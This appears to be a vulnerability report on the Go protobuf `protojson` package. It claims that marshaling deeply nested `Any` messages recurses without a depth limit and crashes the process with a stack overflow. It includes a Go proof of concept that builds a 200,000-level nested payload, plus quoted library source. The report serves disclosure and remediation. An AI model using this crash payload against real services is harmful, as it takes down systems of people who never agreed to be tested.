Found a legitimate analog. `encoding/protojson`'s `Any` marshaling recursion has no depth limit or stack guard, unlike every other recursive path in the same package (both `proto.Unmarshal`'s `RecursionLimit` and `protojson`'s own `skipJSONValue` guard).

### Title
Unbounded recursion in `protojson` `Any`-message JSON marshaling causes unrecoverable stack-overflow crash - (File: `encoding/protojson/well_known_types.go`)

### Summary
`encoder.marshalAny` in `encoding/protojson/well_known_types.go` recursively decodes and re-marshals `google.protobuf.Any` payloads without any depth counter or `RuntimeHelpers`-style stack guard. A message containing an `Any` field whose embedded value is itself an `Any` (nested arbitrarily deep inside the binary `value` bytes) causes `marshalAny` to call itself recursively once per nesting level when the message is serialized to JSON via `protojson.Marshal`/`MarshalOptions.Marshal`. Because each level's payload is only decoded lazily during marshal (the outer `proto.Unmarshal` treats nested `Any.Value` as opaque bytes, so the wire-level `RecursionLimit` never sees the true nesting depth), an attacker can supply a compact, deeply-nested `Any` chain that decodes fine but blows the Go call stack during JSON marshaling.

### Finding Description
`Any.Value` is stored as ordinary `bytes` at the wire level, so `proto.Unmarshal`'s per-call `RecursionLimit` (checked in `internal/impl/decode.go` via `opts.depth--`, and in `proto/decode.go`) is not decremented for content hidden inside those bytes — that content is opaque until something explicitly decodes it. [1](#0-0) 

`protojson`'s `marshalAny` is exactly the thing that decodes that opaque content, on demand, once per marshal call, with **no depth tracking of its own**:
```go
func (e encoder) marshalAny(m protoreflect.Message) error {
    ...
    em := emt.New()
    err = proto.UnmarshalOptions{...}.Unmarshal(valueVal.Bytes(), em.Interface())
    ...
    if marshal := wellKnownTypeMarshaler(emt.Descriptor().FullName()); marshal != nil {
        ...
        return marshal(e, em)   // recurses into marshalAny again if em is itself an Any
    }
    if err := e.marshalMessage(em, typeURL); err != nil { ... }
``` [2](#0-1) 

Each recursive call to `Unmarshal` only ever sees a single shallow `Any` struct (two fields), so its own `RecursionLimit` budget is irrelevant to how many `Any`-in-`Any` levels an attacker can chain across separate `marshalAny` invocations. The chain of `marshalAny → marshalMessage → marshalSingular → marshalMessage → marshalAny → ...` grows the Go call stack by a fixed number of frames per level, with no check comparable to the `open > d.opts.RecursionLimit` guard that protects JSON *decoding* elsewhere in the same file. [3](#0-2) 

Compare this to the JSON marshaling of ordinary nested messages (`marshalSingular`/`marshalMessage`), whose recursion depth is bounded because it walks an in-memory tree that was itself built by `proto.Unmarshal` under `RecursionLimit`. [4](#0-3)  The `Any` special-case breaks that invariant because it re-enters the decoder for opaque bytes at marshal time.

### Impact Explanation
In Go, a stack-overflow condition triggers `fatal error: stack overflow`, which is not a regular panic and cannot be recovered with `recover()` — it terminates the process immediately. Any service that (a) accepts untrusted binary protobuf input containing an `Any`-typed field (a common envelope/event pattern) via the default `proto.Unmarshal`, and (b) later serializes that message to JSON via `protojson.Marshal` (e.g., logging, REST gateways such as grpc-gateway, admin/debug endpoints, audit pipelines) can be crashed by a single unprivileged request. This is an availability impact (CWE-674, uncontrolled recursion), matching the CVSS profile of the analog report (`A:H`, no confidentiality/integrity impact, no privileges required).

### Likelihood Explanation
Exploitation requires only:
- A protobuf message schema with a `google.protobuf.Any` field (extremely common, and `google.protobuf.Any` is always registered in `protoregistry.GlobalTypes`, so no custom resolver or attacker-controlled descriptor is needed — `Any` wrapping `Any` resolves trivially via the default global registry).
- A crafted binary payload nesting `Any` inside `Any.Value` bytes to sufficient depth (a few thousand levels, each only a few bytes, so the whole payload can be small).
- The victim service calling `protojson.Marshal`/`Format` on the resulting message, which is standard practice for any service that exposes protobuf-backed data as JSON.

No authentication bypass, custom resolver, or malicious peer/schema is required — only ordinary use of `proto.Unmarshal` followed by `protojson.Marshal` on attacker-supplied bytes.

### Recommendation
Add a recursion-depth counter (or reuse `MarshalOptions`/encoder-level `RecursionLimit`, mirroring `UnmarshalOptions.RecursionLimit`) to `encoder.marshalAny` and thread it through `marshalMessage`/`marshalSingular`/`marshalValue`, returning an error once the limit is exceeded — analogous to the existing `skipJSONValue` guard. Additionally, consider capping the depth of `Any`-unwrapping specifically, since it is the only path that re-enters `Unmarshal` mid-marshal.

### Proof of Concept
```go
package main

import (
	"google.golang.org/protobuf/encoding/protojson"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/types/known/anypb"
)

// Wrapper is any message with a single google.protobuf.Any field, e.g.:
//   message Wrapper { google.protobuf.Any payload = 1; }
// (substitute your project's actual envelope message type)

func buildNestedAny(depth int) *anypb.Any {
	const anyTypeURL = "type.googleapis.com/google.protobuf.Any"
	inner := &anypb.Any{} // innermost, empty Any
	for i := 0; i < depth; i++ {
		b, _ := proto.Marshal(inner)
		inner = &anypb.Any{TypeUrl: anyTypeURL, Value: b}
	}
	return inner
}

func main() {
	// depth chosen large enough to exceed the goroutine stack
	// (each level adds several Go stack frames across
	// marshalAny -> marshalMessage -> marshalSingular -> marshalAny)
	nested := buildNestedAny(200000)

	w := &Wrapper{Payload: nested} // Wrapper.Payload is a google.protobuf.Any field

	// This call recurses once per nesting level with no depth check
	// in encoder.marshalAny, and crashes the process with
	// "fatal error: stack overflow" (unrecoverable).
	_, _ = protojson.Marshal(w)
}
```
The crash occurs inside `encoder.marshalAny` at [5](#0-4)  via the unbounded `marshal(e, em)` / `e.marshalMessage(em, typeURL)` recursion, with each level's `Unmarshal` call at [6](#0-5)  only ever validating one shallow level rather than the true accumulated depth.

func (e encoder) marshalAny(m protoreflect.Message) error {
	fds := m.Descriptor().Fields()
	fdType := fds.ByNumber(genid.Any_TypeUrl_field_number)
	fdValue := fds.ByNumber(genid.Any_Value_field_number)

	if !m.Has(fdType) {
		if !m.Has(fdValue) {
			// If message is empty, marshal out empty JSON object.
			e.StartObject()
			e.EndObject()
			return nil
		} else {
			// Return error if type_url field is not set, but value is set.
			return errors.New("%s: %v is not set", genid.Any_message_fullname, genid.Any_TypeUrl_field_name)
		}
	}

	typeVal := m.Get(fdType)
	valueVal := m.Get(fdValue)

	// Resolve the type in order to unmarshal value field.
	typeURL := typeVal.String()
	emt, err := e.opts.Resolver.FindMessageByURL(typeURL)
	if err != nil {
		return errors.New("%s: unable to resolve %q: %v", genid.Any_message_fullname, typeURL, err)
	}

	em := emt.New()
	err = proto.UnmarshalOptions{
		AllowPartial: true, // never check required fields inside an Any
		Resolver:     e.opts.Resolver,
	}.Unmarshal(valueVal.Bytes(), em.Interface())
	if err != nil {
		return errors.New("%s: unable to unmarshal %q: %v", genid.Any_message_fullname, typeURL, err)
	}

	// If type of value has custom JSON encoding, marshal out a field "value"
	// with corresponding custom JSON encoding of the embedded message as a
	// field.
	if marshal := wellKnownTypeMarshaler(emt.Descriptor().FullName()); marshal != nil {
		e.StartObject()
		defer e.EndObject()

		// Marshal out @type field.
		e.WriteName("@type")
		if err := e.WriteString(typeURL); err != nil {
			return err
		}

		e.WriteName("value")
		return marshal(e, em)
	}

	// Else, marshal out the embedded message's fields in this Any object.
	if err := e.marshalMessage(em, typeURL); err != nil {
		return err
	}

	return nil
}

func (d decoder) skipJSONValue() error {
	var open int
	for {
		tok, err := d.Read()
		if err != nil {
			return err
		}
		switch tok.Kind() {
		case json.ObjectClose, json.ArrayClose:
			open--
		case json.ObjectOpen, json.ArrayOpen:
			open++
			if open > d.opts.RecursionLimit {
				return errors.New("exceeded max recursion depth")
			}
		case json.EOF:
			// This can only happen if there's a bug in Decoder.Read.
			// Avoid an infinite loop if this does happen.
			return errors.New("unexpected EOF")
		}
		if open == 0 {
			return nil
		}
	}
}
